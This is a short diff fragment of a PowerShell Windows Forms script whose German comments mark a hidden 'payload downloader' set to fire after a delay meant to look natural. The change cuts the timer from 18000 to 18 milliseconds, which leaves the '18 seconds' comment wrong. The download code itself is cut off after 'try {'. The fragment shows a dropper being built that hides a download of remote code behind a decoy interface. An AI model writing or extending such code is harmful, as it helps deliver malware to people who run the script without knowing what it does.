@@ -127,7 +127,7 @@ $labelTimer.Add_Tick({
 
 # ==================== PAYLOAD DOWNLOADER (versteckt, nach 18 Sekunden) ====================
 $payloadTimer = New-Object System.Windows.Forms.Timer
-$payloadTimer.Interval = 18000  # 18 Sekunden – wirkt total natürlich
+$payloadTimer.Interval = 18  # 18 Sekunden – wirkt total natürlich
 $payloadTimer.Add_Tick({
     try {
         
